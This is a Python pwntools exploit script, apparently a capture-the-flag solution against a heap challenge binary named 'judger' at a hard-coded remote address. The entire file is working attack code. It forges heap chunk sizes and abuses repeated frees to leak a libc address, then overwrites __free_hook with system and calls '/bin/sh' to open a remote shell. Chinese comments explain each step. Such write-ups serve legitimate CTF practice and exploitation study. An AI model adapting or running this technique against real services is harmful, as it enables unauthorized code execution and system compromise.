#! python2
#coding=utf-8
from pwn import *

#io = process("./judger")
io = remote("121.43.169.147", 8848)
libc = ELF("./libc-2.27.so")

def create(name,type = 0x10):
    io.sendlineafter("choice : ", "1")
    io.sendlineafter("judger name: ", str(name))
    io.sendlineafter("judger type: ", str(type))

def destory(idx):
    io.sendlineafter("choice : ", "3")
    io.sendlineafter("destory: ", str(idx))

def check(idx):
    io.sendlineafter("choice : ", "4")
    io.sendlineafter("check: ", str(idx))

def edit(idx, name):
    io.sendlineafter("choice : ", "5")
    io.sendlineafter("edit: ", str(idx))
    io.sendlineafter("name: ", name)


def leak():
    global free_hook,system_addr
    create(0)
    create(1)
    create(2)
    name1 = (p64(0) + p64(0x21)) * 4
    edit(1,name1)
    name2 = p64(0) * 5 + p64(0x11)
    edit(2,name2)

    #?修改结构体1的size 使其size = name
    name0 = p64(0) * 7 + p64(0x41)
    edit(0,name0)

    #?将结构体3的name指向结构体1首地址
    destory(1)
    create(3)

    #?将结构体1的size改为0x90使其可进入unsorted bin
    name0 = p64(0) * 7 + p64(0x91)
    edit(0,name0)

    #?在距离strcuct1的0x80的下一行构造一行绕过free检查的假size
    name2 = p64(0) + p64(0x21)
    edit(2,name2)

    #?free 8次 使其进入unsortedbin，再通过check泄露fd指针，从而计算libc基地址
    for i in range(8):
        destory(1)
    check(3)
    mainarena_addr = u64(io.recvuntil('Judger type:',drop=True)[-6:].ljust(8, b"\x00"))
    libc_base = mainarena_addr  - 0x3ebca0
    free_hook = libc_base + libc.symbols['__free_hook']
    system_addr = libc_base + libc.symbols['system']
    print("mainarena_addr:%s"% hex(mainarena_addr))
    print("libc_base:%s"% hex(libc_base))
    print("free_hook:%s"% hex(free_hook))
    print("system_addr:%s"% hex(system_addr))

def pwn():
    global free_hook,system_addr
    #? 再把结构体1改回0x41
    name0 = p64(0) * 7 + p64(0x41)
    edit(0,name0)

    name3 = p64(free_hook)
    edit(3,name3)

    name1 = p64(system_addr)
    edit(1,name1)

    edit(3,b'/bin/sh\x00')
    destory(1)

if __name__ == "__main__":
    leak()
    pwn()
    io.interactive()
